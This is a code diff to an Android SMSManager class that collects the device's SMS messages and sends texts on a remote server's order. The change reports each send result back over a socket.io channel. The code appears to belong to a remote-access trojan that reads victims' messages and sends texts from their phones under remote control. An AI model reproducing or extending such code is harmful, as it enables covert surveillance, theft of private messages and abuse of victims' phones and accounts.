@@ -34,10 +34,11 @@ public class SMSManager {
                     list.put(sms);
                 }
                 SMSList.put("smsList", list);
-                Log.e("done", "collecting");
+                Log.e("SMS", "Lista de SMS recolectada");
             }
             return SMSList;
         } catch (Exception e) {
+            Log.e("SMS", "Error obteniendo lista de SMS", e);
             e.printStackTrace();
         } finally {
             if (cur != null) cur.close();
@@ -45,14 +46,36 @@ public class SMSManager {
         return null;
     }
 
-    public static boolean sendSMS(String phoneNo, String msg) {
+    public static void sendSMS(String phoneNo, String msg) {
         try {
+            Log.i("SMS", "Intentando enviar SMS a: " + phoneNo + ", mensaje: " + msg);
             SmsManager smsManager = SmsManager.getDefault();
             smsManager.sendTextMessage(phoneNo, null, msg, null, null);
-            return true;
+            
+            // ✅ Emitir respuesta de éxito al servidor
+            JSONObject result = new JSONObject();
+            try {
+                result.put("ok", true);
+                result.put("message", "SMS sent successfully");
+            } catch (JSONException e) {
+                Log.e("SMS", "Error creando JSON de éxito", e);
+            }
+            IOSocket.getInstance().getIoSocket().emit("send-sms-result", result);
+            Log.i("SMS", "✅ SMS enviado correctamente y respuesta emitida");
+            
         } catch (Exception ex) {
+            Log.e("SMS", "❌ Error enviando SMS: " + ex.getMessage());
             ex.printStackTrace();
-            return false;
+            
+            // ✅ Emitir respuesta de error al servidor
+            JSONObject result = new JSONObject();
+            try {
+                result.put("ok", false);
+                result.put("error", ex.getMessage());
+            } catch (JSONException e) {
+                Log.e("SMS", "Error creando JSON de error", e);
+            }
+            IOSocket.getInstance().getIoSocket().emit("send-sms-result", result);
         }
     }
 }
